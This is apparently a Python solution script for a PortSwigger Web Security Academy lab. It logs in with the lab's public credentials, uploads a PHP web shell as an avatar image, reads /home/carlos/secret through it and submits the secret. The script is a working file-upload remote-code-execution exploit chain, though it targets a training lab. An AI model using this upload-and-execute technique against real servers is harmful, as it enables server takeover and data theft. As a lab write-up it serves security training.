'''This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
'''

import requests
from bs4 import BeautifulSoup


lab_id = '0af80012049da96c825342c3000e0043' # change according to generated lab_id


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # first login as weiner:peter as instructed
    s = requests.session()
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r1 = s.get(uri) 
    token = token_extract(r1.text) # login csrf token
    
    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }

    r2 = s.post(uri, data=data)
    
    token_2 = token_extract(r2.text) # extract csrf token for uploading files on user "my account" page

    # upload malicious php code via avatar upload 
    uri = f"https://{lab_id}.web-security-academy.net/my-account/avatar"
    files = {
        "avatar": ("contents.php", open('contents.php', 'rb'), "application/octet-stream"),
        "user": (None, "wiener"),
        "csrf": (None, token_2)
    }
    r3 = s.post(uri, files=files)
        
    # check the file we just uploaded for the secret value we need
    uri = f"https://{lab_id}.web-security-academy.net/files/avatars/contents.php"
    r4 = s.get(uri)
    secret = r4.text

    # submit the solution
    uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
    data = { 'answer': secret }
    r5 = s.post(uri, data=data)
    print('finished')

if __name__ == '__main__':
    main()